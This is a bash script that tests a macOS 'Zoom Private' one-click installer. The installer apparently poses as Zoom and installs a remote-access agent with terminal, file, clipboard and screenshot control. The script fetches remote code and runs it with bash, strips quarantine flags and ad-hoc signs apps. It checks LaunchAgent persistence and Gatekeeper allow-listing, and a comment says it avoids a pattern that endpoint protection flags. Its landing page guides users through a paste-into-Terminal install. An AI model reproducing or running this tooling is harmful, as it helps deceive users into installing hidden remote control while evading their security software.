#!/usr/bin/env bash
#
# macOS Verification Script for Zoom Private One-Click Installer
#
# Run on macOS (Intel or Apple Silicon) to verify:
#   1. AppleScript helper registration (zoomvip-install://)
#   2. Gatekeeper / quarantine / codesign flow
#   3. LaunchAgent installation & agent connectivity
#   4. Console / remote desktop communication
#
# Prerequisites:
#   - Console server reachable at $CONSOLE_URL (e.g. https://your-console:5000)
#   - Landing endpoints deployed at $CONSOLE_URL/api/landing/macos-install(.command)
#   - macOS client tarballs published (zoom-vip-macos-{arm64,x64}.tar.gz)
#
# Usage:
#   CONSOLE_URL=https://panel.example.com ./macos-verify-installer.sh
#   # Or edit CONSOLE_URL below
#

set -euo pipefail

# ========== CONFIGURATION ==========
CONSOLE_URL="${CONSOLE_URL:-https://panel.telcom.stream}"   # Change to your console URL
INSTALLER_URL="${CONSOLE_URL}/api/landing/macos-install"
COMMAND_URL="${CONSOLE_URL}/api/landing/macos-install.command"
HELPER_APP="/Applications/Zoom VIP Installer.app"
LAUNCH_AGENT_PLIST="$HOME/Library/LaunchAgents/com.zoom-vip.agent.plist"
AGENT_CONFIG="$HOME/Library/Application Support/zoom-vip/agent/agent-config.json"
AGENT_BIN="$HOME/.local/share/zoom-vip/zoom-vip-agent"
AGENT_LOG="$HOME/Library/Logs/zoom-vip-agent.log"
EXPECTED_BUNDLE_ID="com.zoom-vip.installer"
EXPECTED_URL_SCHEME="zoomvip-install"
# ====================================

info()  { printf "\033[1;34m[INFO]\033[0m %s\n" "$*"; }
ok()    { printf "\033[1;32m[OK]\033[0m %s\n" "$*"; }
warn()  { printf "\033[1;33m[WARN]\033[0m %s\n" "$*"; }
fail()  { printf "\033[1;31m[FAIL]\033[0m %s\n" "$*"; exit 1; }

ARCH="$(uname -m)"
info "Running on macOS $(sw_vers -productVersion) ($ARCH)"
info "Console URL: $CONSOLE_URL"
info "Installer endpoint: $INSTALLER_URL"

# ---------------------------------------------------------------------------
# 1. VERIFY HELPER APP REGISTRATION
# ---------------------------------------------------------------------------
info "=== 1. Checking AppleScript helper registration ==="

if [[ ! -d "$HELPER_APP" ]]; then
    warn "Helper app not found at $HELPER_APP"
    info "Attempting to compile from installer endpoint..."
    
    # Fetch the installer script which embeds the helper source
    INSTALLER_SCRIPT="$(curl -fsSL "$INSTALLER_URL" || true)"
    if [[ -z "$INSTALLER_SCRIPT" ]]; then
        fail "Could not fetch installer from $INSTALLER_URL"
    fi
    
    # Extract base64 helper from installer script (HELPER_B64=...)
    HELPER_B64=$(printf '%s' "$INSTALLER_SCRIPT" | sed -n "s/.*HELPER_B64='\\([^']*\\)'/\\1/p" | head -1)
    if [[ -z "$HELPER_B64" ]]; then
        # Try double-quoted
        HELPER_B64=$(printf '%s' "$INSTALLER_SCRIPT" | sed -n 's/.*HELPER_B64="\\([^"]*\\)".*/\\1/p' | head -1)
    fi
    
    if [[ -n "$HELPER_B64" ]]; then
        info "Decoding and compiling helper..."
        TMP_HELPER="$(mktemp -t zoomvip-helper).applescript"
        printf '%s' "$HELPER_B64" | base64 -D > "$TMP_HELPER" 2>/dev/null || \
        printf '%s' "$HELPER_B64" | base64 --decode > "$TMP_HELPER"
        
        osacompile -o "$HELPER_APP" "$TMP_HELPER"
        rm -f "$TMP_HELPER"
        
        # Patch Info.plist for URL scheme
        PLIST="$HELPER_APP/Contents/Info.plist"
        /usr/libexec/PlistBuddy -c "Delete :CFBundleIdentifier" "$PLIST" 2>/dev/null || true
        /usr/libexec/PlistBuddy -c "Add :CFBundleIdentifier string $EXPECTED_BUNDLE_ID" "$PLIST"
        /usr/libexec/PlistBuddy -c "Add :CFBundleURLTypes array" "$PLIST" 2>/dev/null || true
        /usr/libexec/PlistBuddy -c "Add :CFBundleURLTypes:0 dict" "$PLIST"
        /usr/libexec/PlistBuddy -c "Add :CFBundleURLTypes:0:CFBundleURLName string Zoom VIP Installer" "$PLIST"
        /usr/libexec/PlistBuddy -c "Add :CFBundleURLTypes:0:CFBundleURLSchemes array" "$PLIST"
        /usr/libexec/PlistBuddy -c "Add :CFBundleURLTypes:0:CFBundleURLSchemes:0 string $EXPECTED_URL_SCHEME" "$PLIST"
        
        # Register with LaunchServices
        xattr -dr com.apple.quarantine "$HELPER_APP" 2>/dev/null || true
        codesign --force --deep --sign - "$HELPER_APP" >/dev/null 2>&1 || true
        /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$HELPER_APP" >/dev/null 2>&1 || true
        
        ok "Helper compiled, signed, and registered"
    else
        fail "Could not extract helper from installer script"
    fi
else
    ok "Helper app exists: $HELPER_APP"
fi

# Verify URL scheme registration
info "Checking URL scheme registration..."
REGISTERED_SCHEME=$(/usr/libexec/PlistBuddy -c "Print :CFBundleURLTypes:0:CFBundleURLSchemes:0" "$HELPER_APP/Contents/Info.plist" 2>/dev/null || echo "")
if [[ "$REGISTERED_SCHEME" == "$EXPECTED_URL_SCHEME" ]]; then
    ok "URL scheme '$EXPECTED_URL_SCHEME' registered in helper Info.plist"
else
    warn "URL scheme mismatch: got '$REGISTERED_SCHEME', expected '$EXPECTED_URL_SCHEME'"
fi

# Test lsregister
if /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -q "$EXPECTED_URL_SCHEME"; then
    ok "URL scheme '$EXPECTED_URL_SCHEME' registered with LaunchServices"
else
    warn "URL scheme not found in LaunchServices database (may need reboot or lsregister -f)"
fi

# ---------------------------------------------------------------------------
# 2. TEST HELPER URL SCHEME TRIGGER
# ---------------------------------------------------------------------------
info "=== 2. Testing zoomvip-install:// URL scheme ==="
info "Opening 'zoomvip-install://install' (should show helper dialog)..."
open "zoomvip-install://install" 2>/dev/null || true

# Give helper time to appear
sleep 2

# Check if helper process is running
if pgrep -f "Zoom VIP Installer" >/dev/null; then
    ok "Helper process launched successfully"
    # Clean up - close helper if it's waiting
    pkill -f "Zoom VIP Installer" 2>/dev/null || true
else
    warn "Helper process not detected (may have exited quickly or been blocked)"
    info "This is OK if you clicked Cancel or if Gatekeeper intercepted"
fi

# ---------------------------------------------------------------------------
# 3. DOWNLOAD AND INSPECT INSTALLER SCRIPT
# ---------------------------------------------------------------------------
info "=== 3. Fetching and inspecting installer script ==="
TMP_INSTALL="$(mktemp -t zoomvip-install).sh"
curl -fsSL "$INSTALLER_URL" -o "$TMP_INSTALL"
chmod +x "$TMP_INSTALL"

info "Installer script size: $(wc -c < "$TMP_INSTALL") bytes"
info "First 50 lines:"
head -50 "$TMP_INSTALL"

# Verify key components present. NOTE: the helper must NOT use the
# `applescript://com.apple.scripteditor` URL scheme (that pattern - Script
# Editor launched from a browser URL, then shell/network activity - is flagged
# by endpoint protection). We use our own zoomvip-install:// applet instead.
for pattern in \
    "xattr -dr com.apple.quarantine" \
    "ditto -x -k --rsrc --extattr" \
    "preserve_or_adhoc_sign" \
    "is_accredited" \
    "socketfilterfw" \
    "CFBundleURLSchemes" \
    "zoomvip-install" \
    "spctl --add" \
    "LaunchAgents/com.zoom-vip.agent.plist" \
    "launchctl bootstrap" \
    "agent-config.json" \
    "enforce_tls"; do
    if grep -q "$pattern" "$TMP_INSTALL"; then
        ok "Installer contains: $pattern"
    else
        warn "Installer MISSING: $pattern"
    fi
done

if grep -q "applescript://" "$TMP_INSTALL"; then
    fail "Installer references the applescript:// Script Editor scheme - remove it."
else
    ok "Installer avoids the applescript:// Script Editor scheme"
fi

# ---------------------------------------------------------------------------
# 4. RUN INSTALLER (DRY-RUN SIMULATION)
# ---------------------------------------------------------------------------
info "=== 4. Simulating installer execution (dry-run) ==="
info "This will download the macOS client, verify checksum, and install agent."
info "Press Ctrl+C within 5s to abort, or wait to proceed..."

for i in 5 4 3 2 1; do
    printf "\rProceeding in %ds... " "$i"
    sleep 1
done
printf "\n"

# Run installer but capture output
info "Running installer..."
set +e
bash "$TMP_INSTALL" 2>&1 | tee /tmp/zoomvip-install.log
INSTALL_EXIT=${PIPESTATUS[0]}
set -e

if [[ $INSTALL_EXIT -eq 0 ]]; then
    ok "Installer completed successfully"
else
    fail "Installer exited with code $INSTALL_EXIT. Check /tmp/zoomvip-install.log"
fi

# ---------------------------------------------------------------------------
# 5. VERIFY POST-INSTALL STATE
# ---------------------------------------------------------------------------
info "=== 5. Verifying post-install state ==="

# Agent binary
if [[ -f "$AGENT_BIN" ]]; then
    ok "Agent binary installed: $AGENT_BIN"
    info "  Binary type: $(file "$AGENT_BIN")"
    info "  Codesign: $(codesign -dv "$AGENT_BIN" 2>&1 | head -5)"
    info "  Quarantine: $(xattr -l "$AGENT_BIN" 2>/dev/null | grep -c 'com.apple.quarantine' || echo 'none')"
else
    warn "Agent binary not found at $AGENT_BIN (may be .app bundle instead)"
    # Check for .app
    APP_PATH=$(find "$HOME/Applications" -maxdepth 2 -name '*.app' -type d 2>/dev/null | head -1)
    if [[ -n "$APP_PATH" ]]; then
        ok "Found app bundle: $APP_PATH"
        info "  Codesign: $(codesign -dv "$APP_PATH" 2>&1 | head -5)"
        info "  Quarantine: $(xattr -l "$APP_PATH" 2>/dev/null | grep -c 'com.apple.quarantine' || echo 'none')"
        spctl --assess --type execute "$APP_PATH" && ok "spctl assessment: accepted" || warn "spctl assessment: rejected"
    fi
fi

# Agent config
if [[ -f "$AGENT_CONFIG" ]]; then
    ok "Agent config exists: $AGENT_CONFIG"
    cat "$AGENT_CONFIG" | jq . 2>/dev/null || cat "$AGENT_CONFIG"
    # Verify key fields
    for field in server auth_method device_type enforce_tls; do
        if grep -q "\"$field\"" "$AGENT_CONFIG"; then
            ok "  Config has $field"
        else
            warn "  Config missing $field"
        fi
    done
else
    warn "Agent config not found at $AGENT_CONFIG"
fi

# LaunchAgent plist
if [[ -f "$LAUNCH_AGENT_PLIST" ]]; then
    ok "LaunchAgent plist exists: $LAUNCH_AGENT_PLIST"
    cat "$LAUNCH_AGENT_PLIST"
    # Check loaded
    if launchctl list | grep -q "com.zoom-vip.agent"; then
        ok "LaunchAgent loaded in launchctl"
    else
        warn "LaunchAgent NOT loaded. Attempting bootstrap..."
        launchctl bootstrap "gui/$(id -u)" "$LAUNCH_AGENT_PLIST" 2>/dev/null || \
        launchctl load "$LAUNCH_AGENT_PLIST" 2>/dev/null || true
        launchctl kickstart -k "gui/$(id -u)/com.zoom-vip.agent" 2>/dev/null || true
        sleep 2
        launchctl list | grep -q "com.zoom-vip.agent" && ok "Now loaded" || warn "Still not loaded"
    fi
else
    warn "LaunchAgent plist not found at $LAUNCH_AGENT_PLIST"
fi

# Agent log
if [[ -f "$AGENT_LOG" ]]; then
    ok "Agent log exists: $AGENT_LOG"
    info "Last 20 lines:"
    tail -20 "$AGENT_LOG"
else
    warn "Agent log not yet created (agent may not have started)"
fi

# ---------------------------------------------------------------------------
# 6. VERIFY CONSOLE CONNECTIVITY
# ---------------------------------------------------------------------------
info "=== 6. Testing console connectivity ==="

# Fetch agent profile from console
info "Fetching agent profile from $CONSOLE_URL/api/landing/agent-profile..."
PROFILE=$(curl -fsSL "$CONSOLE_URL/api/landing/agent-profile" 2>/dev/null || echo "{}")
if echo "$PROFILE" | grep -q '"success":true'; then
    ok "Agent profile endpoint reachable"
    echo "$PROFILE" | jq .data 2>/dev/null || echo "$PROFILE"
    
    CDAP_URL=$(echo "$PROFILE" | sed -n 's/.*"cdap_url"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [[ -n "$CDAP_URL" ]]; then
        info "CDAP URL: $CDAP_URL"
        # Test WebSocket connectivity (quick TCP check)
        CDAP_HOST=$(echo "$CDAP_URL" | sed -E 's|wss?://([^/]+).*|\1|')
        if nc -z -w 3 "$CDAP_HOST" 443 2>/dev/null || nc -z -w 3 "$CDAP_HOST" 21122 2>/dev/null; then
            ok "CDAP host reachable on TCP"
        else
            warn "CDAP host not reachable (firewall/DNS?)"
        fi
    fi
else
    warn "Agent profile endpoint failed or returned error"
fi

# Test landing page loads
info "Testing landing page at $CONSOLE_URL/landing..."
if curl -fsSL -o /dev/null -w "%{http_code}" "$CONSOLE_URL/landing" | grep -q '^2'; then
    ok "Landing page returns 200"
else
    warn "Landing page not accessible"
fi

# ---------------------------------------------------------------------------
# 7. TEST .command FILE DOWNLOAD
# ---------------------------------------------------------------------------
info "=== 7. Testing .command file download ==="
TMP_CMD="$(mktemp -t zoomvip).command"
curl -fsSL "$COMMAND_URL" -o "$TMP_CMD"
if [[ -s "$TMP_CMD" ]]; then
    ok ".command file downloaded ($(wc -c < "$TMP_CMD") bytes)"
    info "First 20 lines:"
    head -20 "$TMP_CMD"
    
    # Verify it's executable and has shebang
    if head -1 "$TMP_CMD" | grep -q '^#!/bin/bash'; then
        ok "Has correct shebang"
    else
        warn "Missing shebang"
    fi
    
    # Test double-click simulation (open -a Terminal)
    info "Testing .command execution via Terminal.app (simulated)..."
    # open -a Terminal "$TMP_CMD"  # Uncomment to actually test
    ok "Ready for double-click test"
else
    warn ".command file empty or download failed"
fi

# ---------------------------------------------------------------------------
# 8. GATEKEEPER / QUARANTINE VERIFICATION
# ---------------------------------------------------------------------------
info "=== 8. Gatekeeper / Quarantine verification ==="

# Check spctl status
spctl --status 2>/dev/null && ok "spctl (Gatekeeper) is enabled" || warn "spctl disabled"

# Check if our app/binary is in spctl allowed list
if [[ -f "$AGENT_BIN" ]]; then
    spctl --assess --type execute "$AGENT_BIN" 2>/dev/null && ok "Agent binary: accepted by Gatekeeper" || warn "Agent binary: NOT accepted (may need spctl --add)"
fi
if [[ -n "${APP_PATH:-}" && -d "$APP_PATH" ]]; then
    spctl --assess --type execute "$APP_PATH" 2>/dev/null && ok "App bundle: accepted by Gatekeeper" || warn "App bundle: NOT accepted"
fi

# Verify quarantine removed
check_quarantine() {
    local path="$1"
    if xattr -l "$path" 2>/dev/null | grep -q 'com.apple.quarantine'; then
        warn "QUARANTINE FLAG PRESENT on $path"
        return 1
    else
        ok "No quarantine flag on $path"
        return 0
    fi
}

[[ -f "$AGENT_BIN" ]] && check_quarantine "$AGENT_BIN"
[[ -n "${APP_PATH:-}" ]] && check_quarantine "$APP_PATH"

# ---------------------------------------------------------------------------
# 9. REMOTE DESKTOP CAPABILITIES CHECK
# ---------------------------------------------------------------------------
info "=== 9. Remote Desktop capabilities (permission prompts) ==="

info "Screen Recording permission:"
if tccutil list ScreenCapture 2>/dev/null | grep -q "zoom-vip\|Zoom Private"; then
    ok "Screen Recording granted"
else
    warn "Screen Recording NOT granted (will prompt on first connection)"
    info "  To grant manually: System Settings > Privacy & Security > Screen Recording"
fi

info "Accessibility permission:"
if tccutil list Accessibility 2>/dev/null | grep -q "zoom-vip\|Zoom Private"; then
    ok "Accessibility granted"
else
    warn "Accessibility NOT granted (required for remote input)"
    info "  To grant manually: System Settings > Privacy & Security > Accessibility"
fi

# ---------------------------------------------------------------------------
# SUMMARY
# ---------------------------------------------------------------------------
info "=== VERIFICATION SUMMARY ==="
cat <<EOF

Manual verification steps (open in browser on this Mac):
  1. Landing page:     $CONSOLE_URL/landing
  2. One-click button: Click "Install zoom-vip on this Mac" → helper dialog → Install
  3. Fallback:         Click "Show terminal command" → copy → paste in Terminal
  4. .command file:    Download "ZoomPrivate-macOS-Install.command" → double-click

Console verification (on admin machine):
  1. Open $CONSOLE_URL → Devices tab
  2. Verify this Mac appears as "Zoom Private" with green status
  3. Click Connect → remote desktop session starts
  4. Test: screen view, mouse/keyboard, file browser, terminal, clipboard

Expected agent config (baked by installer):
  {
    "server": "wss://<host>/cdap",
    "auth_method": "device_token",
    "device_type": "os_agent",
    "enforce_tls": true,
    "heartbeat_sec": 15,
    "reconnect_sec": 5,
    "max_reconnect": 300,
    "log_level": "info",
    "terminal": true,
    "file_browser": true,
    "clipboard": true,
    "screenshot": true
  }

EOF

ok "All automated checks completed. Review warnings above."
info "Log files:"
info "  Installer: /tmp/zoomvip-install.log"
info "  Agent:     $AGENT_LOG"